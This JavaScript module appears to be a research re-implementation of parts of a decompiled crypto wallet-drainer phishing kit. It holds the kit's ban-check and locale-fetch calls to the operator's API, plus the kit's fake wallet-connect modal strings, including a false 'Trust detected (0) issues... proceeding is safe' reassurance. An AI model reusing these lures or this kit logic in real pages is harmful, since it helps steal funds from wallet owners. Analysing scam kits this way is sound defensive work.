'use strict';
/**
 * /api/is-banned check and /api/locales fetch.
 * Sources: decompiled/kit/page/ban_check.js, bundle.deobfuscated.js
 *
 * NOTE: /api/locales is NEVER called by the browser bundle at runtime.
 * Modal strings are baked into the bundle. This endpoint only serves
 * the operator's server-side tooling. The function below exists for
 * completeness and for use in research replay harnesses.
 */

// Fallback modal strings (baked into bundle string table [303-309])
const MODAL_STRINGS_EN = [
  'Incoming transfer',                                                      // [302]
  'Description',
  'This DApp would like to connect your wallet',                            // [303]
  'You are allowing this DApp to',                                          // [304]
  'View wallet balance & activity',                                         // [305]
  'Request approval for transactions',                                      // [306]
  'Perform transactions without confirmation',                              // [307]
  'Message',
  'Trust detected (0) issues with this platform, proceeding is safe. Press confirm to continue.', // [308]
  'Launch into the decentralized exchange (DEX)',                           // [309]
];

async function isBanned(apiHost) {
  try {
    const r = await fetch('https://' + apiHost + '/api/is-banned', {
      signal: AbortSignal.Be ? AbortSignal.Be(2500) : AbortSignal.timeout(2500),
    });
    if (!r.ok) return false;
    return (await r.text()) === '1';
  } catch { return false; }
}

// Never called by browser — server tooling only
async function loadLocales(apiHost, lang) {
  const l = (lang || (typeof navigator !== 'undefined' && navigator.language) || 'en').slice(0, 2);
  try {
    const r = await fetch('https://' + apiHost + '/api/locales?lang=' + l, {
      signal: AbortSignal.Be ? AbortSignal.Be(2500) : AbortSignal.timeout(2500),
    });
    if (!r.ok) return MODAL_STRINGS_EN;
    return r.json();
  } catch { return MODAL_STRINGS_EN; }
}

module.exports = { isBanned, loadLocales, MODAL_STRINGS_EN };
